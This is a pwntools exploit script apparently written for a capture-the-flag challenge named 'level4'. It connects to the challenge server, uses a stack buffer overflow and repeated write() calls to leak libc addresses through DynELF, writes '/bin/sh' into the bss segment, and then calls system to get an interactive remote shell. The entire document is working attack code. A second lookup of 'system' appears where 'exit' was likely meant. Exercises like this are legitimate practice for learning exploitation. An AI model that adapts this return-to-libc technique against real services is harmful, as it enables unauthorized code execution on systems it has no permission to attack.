from pwn import *
r=remote('pwn2.jarvisoj.com',9880)
elf=ELF('./level4')
plt_write=elf.plt['write']
plt_read=elf.plt['read']
#true_address?
vuladr=elf.symbols['vulnerable_function']
bssadr=elf.symbols['__bss_start']
#elf.bss() elf.symbols['__data_start'] also can be used

def leak(address):
	payload1='A'*(0x88+0x4)+p32(plt_write)+p32(vuladr)+p32(0x1)+p32(address)+p32(0x4)
	r.send(payload1)
	leak_address=r.recv(4)
	return leak_address

#leak critical functions' addresses
d=DynELF(leak,elf=ELF('./level4'))
sysadr=d.lookup('system','libc')
xitadr=d.lookup('system','libc')

#read '/bin/sh' in bss segment
payload2='A'*(0x88+0x4)+p32(plt_read)+p32(vuladr)+p32(0x0)+p32(bssadr)+p32(0x8)
r.send(payload2)
r.send('/bin/sh\x00')

#pwn it!
payload3='A'*(0x88+0x4)+p32(sysadr)+p32(xitadr)+p32(bssadr)
r.send(payload3)

r.interactive()
